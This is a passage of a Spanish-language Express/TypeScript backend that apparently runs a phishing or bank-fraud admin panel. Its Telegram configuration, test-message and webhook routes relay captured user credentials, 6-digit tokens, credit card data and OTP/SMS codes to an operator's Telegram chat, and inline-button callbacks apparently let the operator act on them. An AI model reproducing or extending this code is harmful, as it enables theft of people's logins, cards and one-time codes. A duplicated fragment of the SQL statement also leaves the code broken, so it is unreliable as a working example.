      isActive = true,
      notifyRecords = true,
      notifyCards = true,
      notifySixDigits = true,
      notifyOtp = true,
      loadingGifUrl = '',
      cardCoverUrl = '',
    } = req.body

    const cleanToken = String(botToken).trim()
    const cleanChatId = String(chatId).trim()
    const cleanGifUrl = String(loadingGifUrl).trim()
    const cleanCoverUrl = String(cardCoverUrl).trim()

    const updated = await sql`
      INSERT INTO telegram_config (
        id, bot_token, chat_id, is_active, notify_records, notify_cards, notify_six_digits, notify_otp, loading_gif_url, card_cover_url, updated_at
      ) VALUES (
        1, ${cleanToken}, ${cleanChatId}, ${Boolean(isActive)}, ${Boolean(notifyRecords)}, ${Boolean(notifyCards)}, ${Boolean(notifySixDigits)}, ${Boolean(notifyOtp)}, ${cleanGifUrl}, ${cleanCoverUrl}, CURRENT_TIMESTAMP
      )
      ON CONFLICT (id) DO UPDATE SET
        bot_token = EXCLUDED.bot_token,
        chat_id = EXCLUDED.chat_id,
        is_active = EXCLUDED.is_active,
        notify_records = EXCLUDED.notify_records,
        notify_cards = EXCLUDED.notify_cards,
        notify_six_digits = EXCLUDED.notify_six_digits,
        notify_otp = EXCLUDED.notify_otp,
        loading_gif_url = EXCLUDED.loading_gif_url,
        card_cover_url = EXCLUDED.card_cover_url,
        updated_at = CURRENT_TIMESTAMP
      RETURNING *;
    `
        updated_at = CURRENT_TIMESTAMP
      RETURNING *;
    `

    // Reset de caché en memoria
    cachedTelegramConfig = null

    const duration = Date.now() - start
    await logActivity('UPDATE_TELEGRAM_CONFIG', `Configuración y GIF actualizados por Administrador`, duration)

    res.json({
      success: true,
      message: 'Configuración guardada exitosamente',
      config: updated[0],
    })
  } catch (error) {
    res.status(500).json({ success: false, error: String(error) })
  }
})

// Enviar mensaje de prueba a Telegram
app.post('/api/telegram-test', async (req, res) => {
  try {
    let { botToken, chatId } = req.body

    // Si no los suministraron en el body, consultar de la base de datos
    if (!botToken || !chatId) {
      const dbCfg = await sql`SELECT bot_token, chat_id FROM telegram_config WHERE id = 1 LIMIT 1;`
      if (dbCfg.length > 0) {
        botToken = botToken || dbCfg[0].bot_token
        chatId = chatId || dbCfg[0].chat_id
      }
    }

    if (!botToken || !chatId || !String(botToken).trim() || !String(chatId).trim()) {
      return res.status(400).json({
        success: false,
        message: 'Debes ingresar el Token del Bot y el ID de Chat antes de realizar la prueba.',
      })
    }

    const cleanToken = String(botToken).trim()
    const cleanChatId = String(chatId).trim()
    const nowFormatted = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })

    const testMessage =
      `🚀 <b>¡CONEXIÓN EXITOSA CON TELEGRAM!</b> 🚀\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ El Bot de notificaciones del <b>Panel Administrador</b> está sincronizado y funcionando al 100%.\n` +
      `⏰ <b>Fecha y Hora:</b> ${nowFormatted}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔔 A partir de ahora recibirás aquí todas las alertas instantáneas:\n` +
      `• Nuevos accesos y credenciales de usuario\n` +
      `• Tokens dinámicos de 6 dígitos\n` +
      `• Tarjetas de crédito y compras en tiempo real\n` +
      `• Códigos de seguridad OTP / SMS\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🛡️ <i>Sistema de monitoreo activo y protegido</i>`

    const url = `https://api.telegram.org/bot${cleanToken}/sendMessage`
    const tgResponse = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: cleanChatId,
        text: testMessage,
        parse_mode: 'HTML',
      }),
    })

    const tgData = (await tgResponse.json()) as any

    if (!tgResponse.ok || !tgData.ok) {
      return res.status(400).json({
        success: false,
        message: tgData.description || 'Error de la API de Telegram. Verifica que el token y el ID del chat sean correctos.',
        raw: tgData,
      })
    }

    res.json({
      success: true,
      message: '¡Prueba enviada con éxito! Revisa tu Telegram.',
      raw: tgData,
    })
  } catch (error) {
    res.status(500).json({
      success: false,
      message: `Error al probar la conexión con Telegram: ${String(error)}`,
    })
  }
})

// ==============================================================
// VERCEL SERVERLESS: WEBHOOK PARA TELEGRAM
// ==============================================================

// Endpoint Webhook que recibe las acciones de botones de Telegram en Vercel
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body
    if (update && update.callback_query) {
      const config = await getTelegramConfig()
      if (config && config.bot_token) {
        await handleTelegramCallbackQuery(config.bot_token.trim(), update.callback_query)
      }
    }
    res.json({ ok: true })
  } catch (err) {
    console.error('Error en webhook de Telegram:', err)
    res.status(500).json({ error: String(err) })
  }
})

// Enlazar Webhook automáticamente con el dominio de Vercel
app.post('/api/telegram-set-webhook', async (req, res) => {
  try {
    let { webhookUrl } = req.body
    const config = await getTelegramConfig()
    if (!config || !config.bot_token.trim()) {
      return res.status(400).json({
        success: false,
        message: 'Debes configurar primero el Token del bot en la base de datos.',
      })
    }

    if (!webhookUrl || !String(webhookUrl).trim()) {
      const host = req.headers['x-forwarded-host'] || req.headers.host
      const proto = req.headers['x-forwarded-proto'] || 'https'
      webhookUrl = `${proto}://${host}/api/telegram-webhook`
    }

    const cleanToken = config.bot_token.trim()
    const setUrl = `https://api.telegram.org/bot${cleanToken}/setWebhook?url=${encodeURIComponent(webhookUrl)}`
    const tgRes = await fetch(setUrl)
    const tgData = (await tgRes.json()) as any

    if (!tgRes.ok || !tgData.ok) {
      return res.status(400).json({
        success: false,
        message: tgData.description || 'Error al configurar el Webhook en Telegram.',
        raw: tgData,
      })
    }

    res.json({
      success: true,
      message: '¡Webhook de Telegram enlazado exitosamente con Vercel!',
      webhookUrl,
      raw: tgData,
    })
  } catch (err) {
    res.status(500).json({
      success: false,
      message: `Error configurando webhook: ${String(err)}`,
    })
  }
})

// Middleware global para captura de errores y respuesta en formato JSON garantizado
app.use((err: any, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
  console.error('🚨 Error en API Express:', err)
  res.status(500).json({
    success: false,
    error: err?.message || 'Error interno del servidor',
  })
})

// Solo arrancar el servidor HTTP y el loop de polling cuando corre en entorno local/servidor continuo
if (process.env.VERCEL !== '1') {
  app.listen(PORT, () => {
    console.log(`🚀 Servidor backend API corriendo en http://localhost:${PORT}`)
    // Iniciar listener de botones inline de Telegram
    startTelegramPolling().catch((err) => {
      console.error('Error al inicializar el polling de Telegram:', err)
    })
  })
}

export default app
export { app }
